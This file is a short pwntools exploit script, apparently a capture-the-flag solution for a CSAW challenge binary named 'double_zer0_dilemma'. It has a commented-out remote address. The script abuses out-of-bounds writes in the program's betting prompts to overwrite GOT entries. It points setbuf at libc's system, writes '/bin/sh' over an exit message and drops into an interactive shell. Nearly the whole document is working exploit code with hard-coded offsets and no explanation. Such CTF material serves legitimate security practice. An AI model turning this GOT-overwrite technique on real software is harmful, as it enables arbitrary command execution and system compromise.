from pwn import *
context.binary = exe =ELF('./double_zer0_dilemma',checksec =False)
def GDB():
    gdb.attach(p,gdbscript='''
    b*rng
    b*0x808A194
    c
    ''')
    input()
p = process(exe.path)

#p = remote("double-zer0.csaw.io",9999)
def play(offset,data):
    p.sendlineafter(b"will land on: ",f"{offset}".encode())
    p.sendlineafter(b"to wager: ",f"{data}".encode())
rsp = 0x000000000808a3bd
rdi = 0x000000000808a3c3
put_pop_rsp_r13 = -0x37
system = 0x52290
#overwrite time@got to play
play(-22,0x7c890d6)
#ow setbuf to libc base
play(-21,-0x84ce0)
#ow setbuf to system
play(-21,system)
play(-24,0xa0) #ow printf to setbuf
play(-12,-0x740700f1040c0d2a) # ow exit message to /bin/sh
play(-11,-0x2e302524203a6c61) # ow null byte
play(-22,0x208-3) # set time@got to exit program
p.interactive()
#KeyboardInterrupt
